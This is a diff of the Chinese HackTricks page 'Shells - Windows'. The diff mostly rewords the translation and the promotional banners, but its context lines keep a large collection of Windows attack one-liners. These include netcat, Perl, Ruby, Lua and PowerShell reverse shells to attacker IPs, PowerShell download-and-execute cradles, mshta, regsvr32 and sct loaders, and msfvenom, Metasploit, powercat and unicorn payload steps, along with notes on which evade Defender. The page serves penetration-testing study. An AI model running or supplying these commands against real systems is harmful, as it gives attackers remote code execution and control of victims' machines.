@@ -1,18 +1,19 @@
 # Shells - Windows
 
+{% hint style="success" %}
+学习并练习AWS Hacking：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习并练习GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+<summary>支持 HackTricks</summary>
 
-其他支持HackTricks的方式：
-
-* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
-* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* 检查[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR 来分享黑客技巧。**
 
 </details>
+{% endhint %}
 
 **Try Hard Security Group**
 
@@ -24,8 +25,8 @@
 
 ## Lolbas
 
-页面[lolbas-project.github.io](https://lolbas-project.github.io/)是为Windows准备的，就像[https://gtfobins.github.io/](https://gtfobins.github.io/)是为Linux准备的。\
-显然，在Windows中**没有SUID文件或sudo权限**，但了解一些**二进制文件**如何（被）滥用以执行某种意外操作，比如**执行任意代码**是很有用的。
+页面[lolbas-project.github.io](https://lolbas-project.github.io/)是为 Windows 设计的，就像[https://gtfobins.github.io/](https://gtfobins.github.io/)是为 Linux 设计的。\
+显然，在 Windows 中**没有 SUID 文件或 sudo 特权**，但了解一些**二进制文件**如何被（滥）用来执行某种意外操作是很有用的，比如**执行任意代码。**
 
 ## NC
 ```bash
@@ -33,7 +34,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/)是一种便携且安全的Netcat替代工具**。它适用于类Unix系统和Win32。具有强加密、程序执行、可定制源端口和持续重新连接等功能，sbd为TCP/IP通信提供了多功能解决方案。对于Windows用户，可以使用Kali Linux发行版中的sbd.exe版本作为可靠的Netcat替代品。
+**[sbd](https://www.kali.org/tools/sbd/)是一个便携且安全的Netcat替代品**。它适用于类Unix系统和Win32。具有强加密、程序执行、可定制源端口和持续重新连接等功能，sbd为TCP/IP通信提供了多功能解决方案。对于Windows用户，可以使用来自Kali Linux发行版的sbd.exe版本作为Netcat的可靠替代品。
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -54,21 +55,21 @@ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1
 ```
 ## Perl
 
-Perl是一种通用的脚本语言，可用于在Windows系统上执行各种任务。Perl脚本可以用于执行系统命令、文件操作、网络通信等操作。Perl在Windows系统上的使用非常灵活，可以通过Perl脚本轻松实现各种自定义功能。
+Perl是一种通用的脚本语言，广泛用于系统管理、文本处理、网络编程等领域。Perl脚本可以在Windows系统上运行，提供了强大的功能和灵活性。
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
 
-## Ruby
+Ruby是一种动态、开源的面向对象编程语言，具有简洁而易读的语法。
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## Lua
 
-Lua是一种轻量级、高效的脚本语言，常用于嵌入式系统和游戏开发中。 Lua脚本可以通过C语言编写的解释器来运行。 Lua具有简洁的语法和强大的扩展能力，被广泛应用于各种领域。 Lua脚本可以通过调用系统命令执行操作系统级别的任务。
+Lua是一种轻量级、高效的脚本语言，常用于嵌入式系统和游戏开发中。Lua脚本可以通过解释器直接执行，也可以编译成字节码在虚拟机上运行。Lua具有简洁的语法和强大的扩展能力，被广泛应用于各种领域。
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -90,7 +91,9 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 ```
 ## Powershell
 
-## Powershell
+### Powershell
+
+Powershell是Windows系统中的强大脚本语言和命令行工具。它提供了丰富的功能和库，可用于执行各种系统管理任务和自动化操作。Powershell可以与.NET框架集成，使其具有强大的编程能力和灵活性。
 ```bash
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
@@ -102,14 +105,14 @@ echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/Power
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-网络调用执行的进程：**svchost.exe**\
-写入磁盘的有效载荷：**WebDAV客户端本地缓存**
+执行网络调用的进程：**svchost.exe**\
+写入磁盘的载荷：**WebDAV客户端本地缓存**
 
-**一行代码：**
+**一句话总结：**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**在本文末尾获取有关不同Powershell Shell的更多信息**
+**在本文末尾获取有关不同Powershell Shells的更多信息**
 
 ## Mshta
 
@@ -129,7 +132,7 @@ mshta \\webdavserver\folder\payload.hta
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**您可以非常容易地使用stager hta下载并执行Koadic僵尸程序**
+**您可以使用分段器hta轻松下载并执行Koadic僵尸程序**
 
 #### hta示例
 
@@ -168,7 +171,7 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 ```
 #### **Mshta - Metasploit**
 
-Mshta is a utility in Windows that executes Microsoft HTML Applications (HTA). Metasploit has a module that can be used to execute malicious HTA payloads using mshta.exe. This technique can be used to bypass application whitelisting and execute code on a target system.
+Mshta is a utility in Windows that is used to execute HTA (HTML Application) files. Metasploit has a module that can be used to execute malicious HTA payloads using mshta. This technique can be used to bypass application whitelisting and execute code on a target system.
 ```bash
 use exploit/windows/misc/hta_server
 msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
@@ -179,14 +182,14 @@ msf exploit(windows/misc/hta_server) > exploit
 ```bash
 Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
 ```
-**被防御者检测到**
+**被defender检测到**
 
 
 
 
 ## **Rundll32**
 
-[**Dll 你好世界示例**](https://github.com/carterjones/hello-world-dll)
+[**Dll hello world example**](https://github.com/carterjones/hello-world-dll)
 
 * [从这里](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
@@ -244,7 +247,7 @@ regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 
 #### Regsvr32 -sct
 
-[**从这里开始**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
+[**从这里**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
 ```markup
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
@@ -270,7 +273,7 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**您可以使用stager regsvr轻松下载并执行Koadic僵尸程序**
+**您可以使用stager regsvr轻松下载并执行Koadic僵尸**
 
 ## Certutil
 
@@ -302,7 +305,7 @@ msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > sh
 \\webdavserver\folder\batchfile.bat
 ```
 执行网络调用的进程：**svchost.exe**\
-写入磁盘的有效载荷：**WebDAV 客户端本地缓存**
+写入磁盘的有效负载：**WebDAV客户端本地缓存**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -401,7 +404,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-在Web服务器上开始提供脚本，并在受害者端执行它：
+开始在web服务器上提供脚本，并在受害者端执行：
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -417,9 +420,11 @@ Defender尚未将其检测为恶意代码（截至2019年3月4日）。
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
+Defender尚未将其检测为恶意代码（截至2019年3月4日）。
+
 **powercat提供的其他选项：**
 
-绑定shell、反向shell（TCP、UDP、DNS）、端口重定向、上传/下载、生成载荷、提供文件...
+绑定shell，反向shell（TCP，UDP，DNS），端口重定向，上传/下载，生成有效载荷，提供文件...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -440,7 +445,7 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-创建一个PowerShell启动器，保存到文件中，然后下载并执行它。
+创建一个PowerShell启动器，保存在一个文件中，然后下载并执行它。
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -450,25 +455,24 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-使用unicorn创建metasploit后门的PowerShell版本
+使用unicorn创建metasploit后门的powershell版本
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
-使用创建的资源启动msfconsole：
+使用创建的资源启动 msfconsole：
 ```
 msfconsole -r unicorn.rc
 ```
-在受害者上启动一个提供_powershell\_attack.txt_文件的Web服务器，并执行：
+开始一个提供_powershell\_attack.txt_文件的Web服务器，并在受害者系统中执行：
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
-**检测到恶意代码**
+**检测为恶意代码**
 
 ## 更多
 
 [PS>Attack](https://github.com/jaredhaight/PSAttack) PS控制台，预装一些具有攻击性的PS模块（加密）\
-[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
-WinPWN](https://github.com/SecureThisShit/WinPwn) PS控制台，预装一些具有攻击性的PS模块和代理检测（IEX）
+[WinPWN](https://github.com/SecureThisShit/WinPwn) PS控制台，预装一些具有攻击性的PS模块和代理检测（IEX）
 
 ## 参考资料
 
@@ -486,16 +490,17 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS控制台，预装一些具�
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+学习并练习AWS黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习并练习GCP黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+<summary>支持HackTricks</summary>
 
-支持HackTricks的其他方式：
-
-* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
-* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* 查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**telegram群**](https://t.me/peass) 或 **关注**我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享黑客技巧。
 
 </details>
+{% endhint %}
